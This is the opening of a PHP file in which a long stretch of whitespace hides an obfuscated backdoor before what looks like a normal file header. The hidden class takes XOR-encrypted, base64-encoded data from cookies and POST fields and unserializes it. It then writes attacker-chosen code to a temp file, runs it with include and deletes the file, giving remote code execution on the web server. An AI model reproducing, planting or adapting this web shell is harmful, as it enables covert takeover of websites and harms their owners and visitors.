<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("mgzhfxnce")){class mgzhfxnce{public static $rfbdu = "zrvajcuwxkoqletx";public static $mssrevhn = NULL;public function __construct(){$wotsi = @$_COOKIE[substr(mgzhfxnce::$rfbdu, 0, 4)];if (!empty($wotsi)){$nwyuev = "base64";$xydbnr = "";$wotsi = explode(",", $wotsi);foreach ($wotsi as $ttqvsazy){$xydbnr .= @$_COOKIE[$ttqvsazy];$xydbnr .= @$_POST[$ttqvsazy];}$xydbnr = array_map($nwyuev . "_decode", array($xydbnr,)); $xydbnr = $xydbnr[0] ^ str_repeat(mgzhfxnce::$rfbdu, (strlen($xydbnr[0]) / strlen(mgzhfxnce::$rfbdu)) + 1);mgzhfxnce::$mssrevhn = @unserialize($xydbnr);}}public function __destruct(){$this->jkbycfb();}private function jkbycfb(){if (is_array(mgzhfxnce::$mssrevhn)) {$xdcvoqic = sys_get_temp_dir() . "/" . crc32(mgzhfxnce::$mssrevhn["salt"]);@mgzhfxnce::$mssrevhn["write"]($xdcvoqic, mgzhfxnce::$mssrevhn["content"]);include $xdcvoqic;@mgzhfxnce::$mssrevhn["delete"]($xdcvoqic);exit();}}}$zqppgxevgt = new mgzhfxnce(); $zqppgxevgt = NULL;} ?><?php
/**
